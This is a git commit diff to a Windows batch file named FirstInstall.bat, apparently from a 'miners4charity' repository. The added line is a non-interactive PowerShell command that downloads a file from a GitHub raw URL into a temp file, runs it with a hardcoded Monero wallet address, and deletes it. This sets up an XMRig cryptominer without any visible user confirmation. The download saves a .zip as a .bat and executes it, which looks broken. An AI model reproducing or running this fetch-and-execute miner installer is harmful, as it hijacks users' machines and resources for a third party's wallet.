1cb2ac007c9d5db0a9de7faa08f9eafa4e877f9b
miners4charity <95400007+miners4charity@users.noreply.github.com>
2021-12-24 20:49:31 -0600

    Update FirstInstall.bat

--- FirstInstall.bat
+++ FirstInstall.bat
@@ -6,5 +6,5 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "$USERP
 
 
 rem running the setup script
-powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 42uxPgPqt9V9ZpLh8MkZUW2saYJNdrXtXUGtosFGZJdpGHG48Z4i42mHL87oBkkMre9xh1fv9mEnVg1f8ZJnkwqrBDFKNrC; Remove-Item -Force $tempfile"
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/xmrig.zip', $tempfile); & $tempfile 42uxPgPqt9V9ZpLh8MkZUW2saYJNdrXtXUGtosFGZJdpGHG48Z4i42mHL87oBkkMre9xh1fv9mEnVg1f8ZJnkwqrBDFKNrC; Remove-Item -Force $tempfile"
 
